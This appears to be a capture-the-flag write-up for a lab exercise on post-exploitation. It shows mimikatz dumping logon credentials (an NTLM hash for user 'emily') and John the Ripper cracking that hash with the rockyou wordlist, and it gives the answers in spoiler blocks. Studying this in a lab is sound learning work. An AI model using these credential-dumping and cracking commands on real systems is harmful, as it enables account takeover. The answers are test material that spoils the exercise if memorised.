# `[Post Exploitation]` Learning From The Grinch

## Story
> McSkidy has learned a lot about how Grinch Enterprises operates and wants to prepare for any future attacks from anyone who hates Christmas. From a forensics analysis they did, she noticed that the Grinch Enterprises performed some malicious activities. She wants to perform these on the same machine they compromised to understand her adversaries a little better. Can you follow along and help her prepare for any other attacks?

### What is the username of the other user on the system? `*****`

Had to use `mimikatz.exe` on a virtual machine in order to extract the data.

```powershell
PS C:\Users\Administrator\Desktop\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 612908 (00000000:00095a2c)
Session           : Interactive from 0
User Name         : emily
Domain            : THM
Logon Server      : THM
Logon Time        : 12/24/2021 3:52:11 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1009
        msv :
         [00000003] Primary
         * Username : emily
         * Domain   : THM
         * NTLM     : 8af326aa4850225b75c592d4ce19ccf5
         * SHA1     : 8c4c6c4e493ec2beef5f6f6a9c4472c13bed42e8
        tspkg :
        wdigest :
         * Username : emily
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : emily
         * Domain   : THM
         * Password : (null)
        ssp :
        credman :
```

<details>
  <summary>Answer:</summary>

```
emily
```
</details>

### What is the NTLM hash of this user? `********************************`

<details>
  <summary>Answer:</summary>

```
8af326aa4850225b75c592d4ce19ccf5
```
</details>

### What is the password for this user? `**********`

Used `john` for this:

```shell
$ echo "8af326aa4850225b75c592d4ce19ccf5" > hash.txt
$ john --format=NT -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt --pot=output.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
1234567890       (?)
1g 0:00:00:00 DONE (2021-12-24 16:00) 14.28g/s 1371p/s 1371c/s 1371C/s 123456..yellow
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
$ cat output.txt
$NT$8af326aa4850225b75c592d4ce19ccf5:1234567890
```

<details>
  <summary>Answer:</summary>

```
1234567890
```
</details>
